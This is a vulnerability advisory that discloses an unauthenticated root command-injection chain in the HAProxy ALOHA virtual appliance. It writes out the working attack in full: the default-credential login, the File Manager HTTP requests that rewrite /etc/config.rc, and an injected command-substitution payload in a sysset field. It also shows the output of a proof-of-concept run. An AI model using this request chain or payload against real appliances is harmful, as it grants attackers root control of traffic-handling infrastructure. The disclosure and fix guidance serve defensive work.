# HAProxy ALOHA VA 18.0.12-1820 - File Manager Root File Write Into config.rc and Root Command Injection Through the sysset Field

Advisory: https://0day-rubbish.com/blog/wfm-configrc-sysset-command-injection-root-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

HAProxy ALOHA VA 18.0.12-1820 exposes a web management interface whose File Manager component allows a
session holder to read and write arbitrary filesystem paths with root authority, and whose init
framework executes configuration text as bash rather than parsing it as data. Composed, the two give an
unauthenticated network client root command execution on the appliance in three HTTP requests.

The record behind this advisory establishes the chain at appliance level rather than at source level
only: the official image was booted in its factory state, the full sequence was driven over the network,
and the resulting marker file was read back, stat-ed from the serial console and located in a guest RAM
dump. The observed identity is root: the marker `/var/state/wui/CFG_PWN_6f9a` is 37 bytes, owned
`root:adm`, and contains exactly `uid=0(root) gid=4(adm) groups=4(adm)`.

Two distinct defects are involved and this advisory keeps them apart. The first is the injection itself
(CWE-78): configuration sections are dispatched to a bash function parser, so a `sysset` value carrying
`$( )` is evaluated as a command by the root process that runs the init script. The second is the
credential that makes the chain head free (CWE-798): the appliance ships `admin`/`admin` and does not
force a change before the management UI is reachable. The second is reported as an adjacent weakness
because rotating the password does not remove the first - the File Manager remains a root file write
primitive for anyone who holds a session.

### Overview of the product, platform and management stack

The product is HAProxy Technologies' virtualized application delivery controller, distributed as an 8 GB
qcow2 image (`aloha-albva-kvm.tgz`) for KVM, VMware and HAProxy Cloud, running HAProxy
3.3.0-aloha-bfd905b3-flx2.19_albva. The management plane is plain HTTP on TCP 4444. That plane is not
stock HAProxy tooling: it is an nginx instance in front of a purpose-built C web UI at `/opt/wui/bin/wui`,
which serves the administrative pages and dispatches component CGIs. One of those components is the File
Manager, `wfm.cgi` (WFM v1.4.2), whose backend `f2cgi_admin` performs file operations as root.

The appliance's runtime configuration lives in `/etc/config.rc`, a bash-dialect file organized into
`service` sections with per-section fields. Both `/etc` and `/var` are tmpfs mounts on this appliance,
which matters for the impact statement: the configuration store the chain writes is a runtime object,
cleared by a reboot, not a persistent one.

### Overview of public-record independence

The File Manager is a product-level component of this vendor's WUI, and the `load_config()` dispatch
belongs to the Formilux/AHA init framework that every ALOHA service script builds on. The finding is
therefore structural: it is not a mistake in one section name, one CGI action or one field, but the
combination of an over-privileged file API and an execution model that treats configuration as code.
The record enumerates the neighbouring surfaces it examined and rejected before settling here (section
4), which is what allows the claim to be scoped precisely: this is the one path in the audited build
where attacker-written text reaches a root shell.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Element | Value |
|---|---|
| Product | HAProxy ALOHA VA (Virtual Appliance) |
| Version | 18.0.12-1820 (`aloha-albva-kvm.tgz`; HAProxy 3.3.0-aloha-bfd905b3-flx2.19_albva) |
| Vendor | HAProxy Technologies |
| Authentication class | Unauthenticated: the chain head takes a WUI session using the factory default `admin`/`admin` pair, which the appliance does not force the operator to change before the management UI is reachable |
| Entry point | TCP 4444, plain HTTP, nginx fronting `/opt/wui/bin/wui` |
| Write primitive | `wfm.cgi` actions `save` and `edit_save`, backend `f2cgi_admin`, root authority, no path confinement |
| Execution sink | `/etc/init.d/functions` line 1463, `load_config()`, `run_stdin parse_cfg <(awk ...)`, bash function dispatch of configuration sections |
| Trigger | `POST /service/action` with `service=network&instance=lo&cmd_act_restart=restart`; WUI dispatches through `alohacore.so` to `cmdwrapper` and executes `/etc/init.d/network restart` as root |
| Observed result | `/var/state/wui/CFG_PWN_6f9a`, 37 bytes, `root:adm`, content `uid=0(root) gid=4(adm) groups=4(adm)` |
| Classification | CWE-78 primary; CWE-798 adjacent |
| Identifier | no identifier assigned |
| Disclosed rating | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical |

### Vulnerability Summary mechanics

Three requests carry the whole chain. The first is a login that yields a `WUISID` cookie. The second is
a File Manager `save` action that returns the current contents of `/etc/config.rc` (11027 bytes in the
analyzed build); the attacker edits that text offline, adding one line to the `service network lo`
section, and submits it through the File Manager's `edit_save` action, which writes the file back as
root and answers HTTP 302. The third is a service action that asks the WUI to restart the `network`
service for instance `lo`; the WUI hands the request to `alohacore.so`, whose `cmdwrapper` runs
`/etc/init.d/network restart` as root. That script calls `load_config()`, which extracts the matching
section from the configuration file with `awk` and feeds it to `run_stdin parse_cfg` - a bash function
dispatcher. The `sysset` line's value is therefore parsed by bash, and the `$( )` inside it is
evaluated as root.

The restart target is deliberately the loopback instance. The record's first proof placed the payload in
the `service network eth0` section and restarted the whole network service, which flushed the
appliance's own address and tore down the web session mid-request (the recorded client exit code is 28);
the marker was still written, and was recovered from the guest RAM dump because the web channel was
gone. The clean reproduction moved the payload to the `service network lo` section, where the restart
touches only loopback: the web session survives, the chain completes in under three seconds, and the
marker can be read back through the same session that created it.

### Vulnerability Summary preconditions

- Network reachability to TCP 4444. The chain uses no local console, no serial attachment and no
  other service.
- The factory default credential pair, in the state the vendor ships. No guess, no brute force and no
  stolen secret is involved in the published vector.
- A writable `/etc` at runtime. It is tmpfs on this appliance; a read-only-rootfs appliance of the same
  design would stop the write, not the injection - the record shows `/etc/init.d` itself is on the
  read-only root filesystem and rejects the same File Manager write with `Read-only file system`, while
  `/etc/config.rc` is on the writable tmpfs.
- No other product state is required: no licence activation (the record notes the evaluation licence
  mode remains usable), no installed workload, no configuration of the load-balancing feature the
  appliance exists to provide.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

The management UI requires a session. `POST /auth` with `alohalogin` and `alohapassword` returns a
`WUISID` cookie on success, and every subsequent WUI request - including both File Manager operations
and the service action - is authorized by that cookie. There is no second factor and no per-action
re-authentication in the chain; the session established once carries all three requests.

### Authentication Boundary - what the chain does not do

- It does not bypass authentication. It authenticates, correctly, with a credential that the product
  publishes for its own factory state.
- It does not brute-force, guess, spray or reuse a credential from another product.
- It does not need an administrator to be present, to click anything, or to have a browser open.
- It does not persist. `/etc` and `/var` are tmpfs; a reboot clears both the payload and the marker.

### Authentication Boundary - why that boundary does not soften the impact

The question a severity score asks is what an attacker must bring. Here the attacker brings the factory
password, which is in the product documentation, and the appliance does not require it to be replaced
before the management UI answers. That makes the boundary nominal in the shipped state - it is a login
prompt, not a secret - which is why the vector reads PR:N and why the default credential is nevertheless
disclosed as its own weakness rather than folded into the injection claim. The two statements are
independent and both are needed: rotating the password does not close the injection (section 11), and
fixing the injection does not close the default credential.

## 4. Attack Surface

### Attack Surface - the web stack and its dispatch model

The management plane has three request families relevant here: the authentication endpoint, the
component CGI dispatcher (`/wfm.cgi` for the File Manager, `/uploadfw.cgi` for upgrade packages, `/diagtools`
for diagnostics), and the service control endpoint `/service/action` plus its submission sibling
`/service/submit`. The File Manager is the only family in the audited build that lets a session write
arbitrary files as root; the service endpoint is the only family that makes the init framework re-read
configuration as root on demand. The chain needs exactly one of each.

### Attack Surface - why the surface audit narrowed here

The record's surface enumeration is worth reproducing because it is what makes the sink claim precise.
Each candidate was examined and negated on evidence, not on assumption:

| Surface | Finding |
|---|---|
| Overwrite inside `/etc/init.d` | Rejected: the root filesystem is read-only; the File Manager write returns `Read-only file system` |
| `actions.conf` command field | Not an injection surface: the WUI resolves it against an internal token allowlist (`getconf`, `setconf`, `start`, `stop`, `reload` and similar) and executes through `execvp`, with no shell |
| `/service/submit` (`ssubmit`) | Blocked by the WUI's own rc-lint: the same payload delivered through the system-console path reaches `testsec` and is rejected as `invalid line` |
| `haproxy.cfg` injection | Rejected: the ALBVA build of HAProxy 3.3 has no agent-check and no external-program keyword that reaches a shell; the parser rejects the attempt, as the restart log shows |
| `/diagtools` | Not an injection surface: the diagnostic runs `/sbin/ip address list dev <param1>` with a single argv element, so `;id` is treated as an interface name and errors; `execvp`, no shell, and the `f2cgi` backend on that path is not root |
| `uploadfw.cgi` | Not reachable: it requires a VLA upgrade package loaded through the vendor's cloud path, which does not exist on a factory appliance |
| `ttyd` | Not counted: it grants an admin shell by design (`-u 100 -g 4`), which is intended product behaviour rather than an injection |
| `/etc/config.rc` plus `load_config` | Confirmed: `$( )` in a section field is evaluated by root bash |

### Attack Surface - components that narrowed out

The negations matter for the fix guidance as much as for the claim. The `actions.conf` result shows the
WUI does have a token-based execution model in one place; the `ssubmit` result shows it also has a
linting gate on one path into the init framework. Neither was applied to the File Manager's write path,
which is why the config store is the one that carries attacker text to execution. A fix that copies the
`actions.conf` pattern - resolve against a fixed vocabulary, never build a command from request text -
would close the class where it exists.

## 5. Sink Identification

### Sink Identification - the write primitive

`wfm.cgi` exposes a small action set over the file API: `save` reads a file and returns it, `edit`
returns it wrapped in a form, `edit_save` writes it back. The backend `f2cgi_admin` runs with root
authority and takes `directory` and `filename` as request parameters with no confinement to a document
root or an allowlisted tree. The read side returns the file's bytes; the write side replaces them and
answers HTTP 302 on success. In the analyzed build the primitive read 11027 bytes from `/etc/config.rc`
and wrote the modified text back to the same path.

This is the write sink: the point where attacker-controlled bytes enter a root-owned file. On its own it
is a root arbitrary file write, which is already a severe defect on an appliance whose configuration is
executed - and the next subsection is what makes the execution concrete.

### Sink Identification - the evaluation sink

`/etc/init.d/functions` line 1463 defines the framework's configuration loader:

```sh
load_config() {
    run_stdin parse_cfg <(awk -v pname="$1" -v inst="$2" \
        '$0 ~ "^service " pname { inside=1 } inside { print }' "$CONFIG")
}
```

The exact `awk` program is abbreviated here to its shape; what matters is the destination. `parse_cfg`
is a bash function, `run_stdin` feeds it the extracted section text, and the section text is therefore
parsed by bash. `$( )` inside a field is command substitution, evaluated by the root process that is
running the init script. This is not a quoting accident inside one script - it is the framework's
chosen mechanism for turning configuration into behaviour, which is why the record classifies every
`.rc`/`.conf` file consumed this way as the same type of sink.

The `network` script declares its configuration fields at line 144 (`option sysset multiple_option`) and
consumes them in `fct_post_start` at lines 768-779, writing values into `/sys/class/net`. The write to
sysfs is the field's legitimate purpose; the substitution happens earlier, when bash parses the
configuration line, which is why the payload executes whether or not the surrounding `sysset` operation
would have succeeded.

### Sink Identification - execution identity

The identity that evaluates the substitution is the identity of the init script invocation. The WUI does
not fork the script directly: `alohacore.so`'s `service_execaction` routes it through `cmdwrapper`, which
the record reads as `cmdwrapper 127.0.0.1 -r root`, executing `/etc/init.d/network restart` as root. The
marker's ownership is the measurement of that identity - `root:adm`, group 4 - and its content,
`uid=0(root) gid=4(adm) groups=4(adm)`, is the substituted command's own report of the identity it ran
under.

## 6. Source Identification

### Source Identification - the parameter and its gates

There is no parameter parsing to defeat in this chain, and that is the point. The source is the attacker's
own request body: the `content` field of the `edit_save` multipart POST, carrying the complete new text of
`/etc/config.rc`. The File Manager writes those bytes verbatim; there is no length gate, no character
gate and no structural validation between the request and the file. The value that later reaches bash is
whatever the attacker chose to type into the file.

The innermost carrier is the `sysset` line's value field inside the `service network lo` section, because
that is the field the section's own consumer reads. But the injection does not depend on that consumer:
bash evaluates the substitution while parsing the section text, before `fct_post_start` is called, so any
field inside any section that `load_config()` extracts behaves identically. The `sysset` field was chosen
because it exists in the `network` script, is declared as a multiple-option field at line 144, and its
value is free-form text - the least constrained carrier in the section.

### Source Identification - what the payload must respect

The payload is placed on its own line inside an indented section body, in the same style as the fields
around it, so that the section remains syntactically ordinary:

```bash
service network lo
    ########## Interface lo : internal loopback.
    ip   address 127.0.0.1/9
    sysset test="$(id > /var/state/wui/CFG_PWN_6f9a)"
```

The constraints are those of the file format, not of a validator: the line must sit within the section
so the `awk` extraction carries it, and its text must survive the read-modify-write cycle unchanged. The
record notes one practical detail about that cycle - the `edit` action returns the file wrapped in a
form, so repeated round trips accumulate HTML escaping; reading with `save` and writing with `edit_save`
avoids the accumulation and keeps the file byte-clean. The payload itself needs no obfuscation, no
encoding and no separator trick: the double quotes around the value are ordinary configuration quoting,
and the substitution inside them is what executes.

### Source Identification - why a config write is code, not data

The distinction the fix has to make is the one the product does not make. A `${...}` or `$(...)` inside a
configuration value is data to a parser and code to bash. `parse_cfg` is a function dispatcher: the
section text is executed as shell with the function table of `functions` available, which is exactly how
the framework intends services to configure themselves. That design choice turns every writable
configuration file into an execution surface, and the File Manager makes one of those files writable by
a web session.

## 7. Data Flow

### Data Flow - end to end

```
[ATTACKER]                                   [ALOHA VA, management plane TCP 4444]
    |
    |  POST /auth  alohalogin=admin&alohapassword=admin
    v
  nginx -> /opt/wui/bin/wui -> 302 + WUISID cookie
    |
    |  GET /wfm.cgi?action=save&directory=/etc/&filename=config.rc
    v
  f2cgi_admin (ROOT) reads /etc/config.rc ................ 11027 bytes
    |
    |  offline edit: insert  sysset test="$(id > /var/state/wui/CFG_PWN_6f9a)"
    |  into the  service network lo  section
    |
    |  POST /wfm.cgi?action=edit_save   (multipart: action, directory, filename, content)
    v
  f2cgi_admin (ROOT) writes /etc/config.rc ............... HTTP 302
    |
    |  POST /service/action  service=network&instance=lo&cmd_act_restart=restart
    v
  wui -> alohacore.so service_execaction -> cmdwrapper 127.0.0.1 -r root
    |
    v
  /etc/init.d/network restart  (ROOT)
    -> load_config()  /etc/init.d/functions:1463
       run_stdin parse_cfg <(awk -v pname=network -v inst=lo ... /etc/config.rc)
       |
       v  bash parses the lo section:  $(id > /var/state/wui/CFG_PWN_6f9a)
          command substitution evaluated by the ROOT bash process
    |
    v
  /var/state/wui/CFG_PWN_6f9a   37 bytes, owner root:adm
  content: uid=0(root) gid=4(adm) groups=4(adm)
```

### Data Flow - properties worth naming

- The taint path contains no memory-safety step. Bytes travel request body to file, file to `awk`
  extraction, extraction to bash, and the only parser that matters is bash's own.
- The decisive re-parse is performed by the product, not by the attacker: `run_stdin parse_cfg` is the
  framework's own dispatch mechanism. Nothing has to be smuggled past a sanitiser because there is no
  sanitiser on the path.
- The write is idempotent and repeatable: the attacker can rewrite the file again through the same
  primitive, so a partial or failed edit costs one more request, not a re-exploitation.
- The trigger is an ordinary product action with a legitimate use. The service action is what an
  operator uses to restart a network instance; nothing about the request distinguishes it from
  administrative routine.
- The chain is stateless between steps: no session variable, no server-side object and no asynchronous
  job is required to survive between the write and the trigger.

## 8. Exploit Construction

The shipped proof of concept is `exploit/haproxy_aloha_wfm_configrc_poc.py`. It is a standard-library
client - `urllib` with a cookie jar and a redirect handler - with `argparse` options for `--target`,
`--port`, the factory credential pair and the marker path. Its default target is the documentation
address 192.0.2.10, and its only device-side effect is the creation of a marker file containing the
identity the substituted command ran under.

### Exploit Construction - request shape

```http
POST /auth HTTP/1.1
Host: <appliance>:4444
Content-Type: application/x-www-form-urlencoded

alohalogin=admin&alohapassword=admin
```

```http
GET /wfm.cgi?action=save&directory=%2fetc%2f&filename=config.rc HTTP/1.1
Host: <appliance>:4444
Cookie: WUISID=<session>
```

```http
POST /wfm.cgi?action=edit_save HTTP/1.1
Host: <appliance>:4444
Cookie: WUISID=<session>
Content-Type: multipart/form-data; boundary=----PWN

------PWN
Content-Disposition: form-data; name="action"

edit_save
------PWN
Content-Disposition: form-data; name="directory"

/etc/
------PWN
Content-Disposition: form-data; name="filename"

config.rc
------PWN
Content-Disposition: form-data; name="content"

<full modified config.rc, payload line inside service network lo>
------PWN--
```

```http
POST /service/action HTTP/1.1
Host: <appliance>:4444
Cookie: WUISID=<session>
Content-Type: application/x-www-form-urlencoded

service=network&instance=lo&syssvc=&cmd_act_restart=restart
```

### Exploit Construction - payload engineering

The injected line is a syntactically ordinary configuration field. It is written with the same leading
indent as the `ip` field above it, and its value is quoted exactly the way the file quotes values:

```bash
    sysset test="$(id > /var/state/wui/CFG_PWN_6f9a)"
```

Three choices in that line are deliberate. The substitution is inside a double-quoted value, which is
where a reader would expect a string; the command is a single `id` redirect, so the marker is written
without any dependency on a second binary or a network fetch; and the marker path is under
`/var/state/wui`, a directory the web stack already writes to, so no directory-creation step is needed
and the resulting ownership is unambiguous. Writing to a directory the product's own service owns also
keeps the artifact easy to locate later through the File Manager, which is how the chain verifies itself
without a console.

The `lo` target deserves the same note. A restart of `eth0` executes the payload just as reliably, but it
also flushes the appliance's management address, which tears down the session that would read the marker
back; the record's first round did exactly that and recovered its evidence from a RAM dump. The `lo`
variant keeps the chain inside one session and one client, which is cleaner to reproduce and which is
what the PoC ships.

### Exploit Construction - what the PoC deliberately does not do

- It does not discover, guess or brute-force credentials. The factory pair is a parameter with the
  documented default; the operator can substitute a different one when testing a hardened deployment.
- It writes one file: the marker. It does not add users, does not schedule tasks, does not install
  persistence, and does not open an interactive channel.
- It touches exactly two device files: the configuration store it must rewrite to carry the payload, and
  the marker. Nothing else is read or written.
- It is not a general-purpose remote shell. The substituted command is fixed at the marker write; the
  operator who needs different command text edits the payload in the script deliberately.
- It defaults to the documentation address rather than to any live host, so an accidental run has no
  target.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Verification method | end-to-end execution against a running appliance in a QEMU system-mode replication environment |
| Target | HAProxy ALOHA VA 18.0.12-1820, official `aloha-albva-kvm.tgz` qcow2 converted to raw, factory first-boot state |
| Environment | `qemu-system-x86_64 -m 2048 -drive aloha.raw,if=ide -netdev user,id=n1,hostfwd=tcp:127.0.0.1:24444-:4444`, management port bound to host loopback only |
| Requests | login, File Manager `save`, File Manager `edit_save`, `POST /service/action` |
| Observation channels | File Manager read-back of the marker; `stat` on the appliance serial console; guest RAM dump via the QEMU monitor (`dump-guest-memory`) |
| Control | the same substitution payload delivered through the service submission path, where the WUI's rc-lint rejects it as `invalid line` |
| Not performed | any execution against physical ALOHA hardware; no sink-level reimplementation was needed, because the real appliance code ran the real scripts |

### Dynamic Verification - the two rounds and their results

The first round placed the payload in the `service network eth0` section and triggered a full network
restart. The restart flushed the appliance's management address, so the client's connection dropped
mid-request (the recorded exit code is 28) and the web channel was gone before the marker could be read
back. The evidence was still recovered: the marker's ownership and size matched the later round, its
text was located in the guest RAM dump at offset 158390328 as the 38-byte region
`uid=0(root) gid=4(adm) groups=4(adm)` followed by a newline - the 37-byte file plus its terminator,
sitting in the tmpfs page cache next to an all-zero region - and the console log showed the network
script's run-time configuration refreshing in the same minute with no `setsec` rejection.

The clean reproduction rebooted the appliance to factory state and drove the whole chain with one script,
with the payload moved to `service network lo`. Its recorded output, in order:

```
[1] factory login ok, sid=SlJTcFJyNE...
[2] root-read /etc/config.rc: 11027 bytes
[3] payload grafted into lo section
[4] root write /etc/config.rc -> HTTP 302 (302=saved)
[5] service action HTTP 200
[6] *** ROOT MARKER /var/state/wui/CFG_PWN_6f9a: 'uid=0(root) gid=4(adm) groups=4(adm)'
```

The script that produced that transcript is the one whose digest the record keeps: sha256
`d14bc31026e559bea15a811900d91143ecfcd5c735c00ee1d83f1c2c178bd830`. The PoC shipped with this advisory
is a re-implementation of the same sequence with the same defaults; it is not that artifact and does not
claim its digest.

### Dynamic Verification - root evidence, three independent channels

The identity claim is not taken from the substitution's own success. It is established three ways, and
the three agree:

1. **File Manager read-back** - the marker is read through the same root channel that wrote the config,
   and its text is exactly `uid=0(root) gid=4(adm) groups=4(adm)`.
2. **Serial console `stat`** - from an admin shell with uid 100, which cannot forge an owner:
   `stat -c "%n|%s|%U:%G|%y" /var/state/wui/CFG_PWN_6f9a` returns `/var/state/wui/CFG_PWN_6f9a|37|root:adm|`
   followed by the modification time. Size 37 and owner `root:adm` are the two facts that matter; a
   process running as uid 100 cannot create a root-owned file.
3. **Guest RAM dump** - the marker text appears at offset 158390328 in memory captured through the QEMU
   monitor, which is what makes the first round's evidence usable even though its network channel was
   destroyed by its own trigger.

### Dynamic Verification - negatives and boundary, stated

- The root observation is a replication-environment observation. The appliance code, the appliance
  filesystem and the appliance init scripts all ran unmodified inside QEMU; no physical unit was driven,
  so hardware behaviour beyond the shared image is not claimed.
- The effect is runtime-only. `/etc` and `/var` are tmpfs mounts on this appliance, verified with
  `mount`; a reboot clears the payload and the marker. Persistence is not claimed.
- The `/etc` filesystem is otherwise read-only: the File Manager write to `/etc/init.d` returns
  `Read-only file system`, which is why the writable configuration store, not the scripts, is the target.
- The control is a differential, not an assertion: the same substitution text delivered through
  `/service/submit` reaches the WUI's linting stage and is rejected as `invalid line`, while the
  configuration-store path executes it. The difference is the path, not the payload.
- No second injection path was claimed. Every other surface in section 4 was examined and negated on
  evidence; a surface that was not examined is not claimed as vulnerable either.

## 10. Reachability and Security Impact

### Reachability - network position

The management plane is a TCP service on port 4444 speaking plain HTTP, and it is the appliance's
designed remote administration interface - the vendor ships it for the operator to reach over the
network. The chain requires nothing else: no console, no adjacent link, no helper service, no
credential from another system. Any position that can open a TCP connection to the management port can
complete all three requests, and the record's environment shows the flow completing from an ordinary
HTTP client in well under three seconds.

### Reachability - impact in concrete terms

- **Integrity of the configuration plane.** An attacker who can write the configuration store and cause
  it to be re-read controls every service the framework manages. The record names the scripts of this
  type: network, syslog, haproxy, lvs, rhi, gslb. For a load balancer, that is control over what is
  proxied, to where, and under which certificates.
- **Confidentiality.** The same File Manager channel that reads `/etc/config.rc` reads any path the
  appliance can read at root: configuration, credentials, key material, logs, anything on the writable
  tmpfs or the readable image.
- **Availability.** Services can be restarted, misconfigured or broken at will through ordinary product
  actions, and the injection itself runs as root with the appliance's own tooling available.
- **Position.** An appliance of this class sits in front of application traffic. Root on it is a place
  from which that traffic can be observed or redirected according to the platform's own capabilities,
  which makes the impact larger than the appliance itself.
- **Stealth.** The chain uses three legitimate administrative requests. There is no malformed input, no
  crash, no error path and no unusual traffic shape for a monitoring product to catch.

### Reachability - what is not claimed

No lateral movement beyond the appliance is demonstrated, no persistence across reboot is claimed, and
no data-path interception was performed. The claimed ceiling is exactly what the marker proves: a
substituted command ran as root inside the appliance.

## 11. Fix Recommendations

1. **Remove root authority from the File Manager, or remove its reachability from a web session.** A
   root-privileged file API should not be dispatchable by an HTTP request. Confine it to a fixed
   directory set with a path allowlist, reject traversal and absolute escapes, and run the backend under
   a dedicated unprivileged identity if the component must stay.
2. **Stop executing configuration text in `load_config()`.** Replace the `run_stdin parse_cfg` dispatch
   with a real parser that reads key/value fields and dispatches on a validated key set. This closes the
   class for every script of the framework at once instead of one section name at a time.
3. **Validate field values as data at the point of use.** Reject shell metacharacters in configuration
   values as they are written, so that a file reaching the init framework from any other source is also
   inert.
4. **Force a credential change on first boot.** Refuse to serve the management UI until the factory pair
   has been replaced. This does not fix the injection - any session holder still reaches it - but it
   removes the unauthenticated path to that session.
5. **Terminate the management plane over TLS and restrict it to an administrative network.** Plain HTTP
   on TCP 4444 puts the session cookie and the factory credential on the wire in the clear, which turns
   an on-path observer into a session holder.
6. **Audit every other writer into the configuration store and every `wfm.cgi` action for the same
   pattern.** The root read and write primitive is a product-level component; a fix scoped to one action
   leaves the primitive intact.
7. **Add an appliance-level regression test.** Write a `sysset` value containing a command substitution
   through the File Manager, restart the service, and assert that no file is created and no output is
   produced by the substituted command.

## 12. CWE

### CWE - classification rationale

**CWE-78, Improper Neutralization of Special Elements used in an OS Command.** This is the primary
classification. The configuration section is dispatched to a bash function parser, the `$( )` inside a
`sysset` value is command substitution, and the process that evaluates it is the root process running
`/etc/init.d/network`. The neutralization gap is not in a validator that can be tightened but in the
architecture: text that a web session can write is text that bash will execute.

**CWE-798, Use of Hard-coded Credentials**, reported as an adjacent weakness rather than as part of the
injection claim. The appliance ships `admin`/`admin` and does not require a change before the management
UI is reachable. It is disclosed separately because it is independently actionable - rotating it is a
one-step operator mitigation with immediate value - and independently insufficient: the File Manager
remains a root file write primitive for any session holder after the rotation, and the config store
remains executed text. Reporting it as the RCE's sole dependency would misdescribe both halves.

### CWE - what is deliberately not claimed

The chain is not a memory-safety defect and no CWE in that family is asserted. It is not a
cryptographic defect, a race condition or a path-traversal-only defect - though the File Manager's lack
of path confinement is what makes the primitive general. The classification is kept to the two
weaknesses the evidence supports so that the fix guidance maps one-to-one onto them.

---

Written by the 0day Rubbish Research Team.
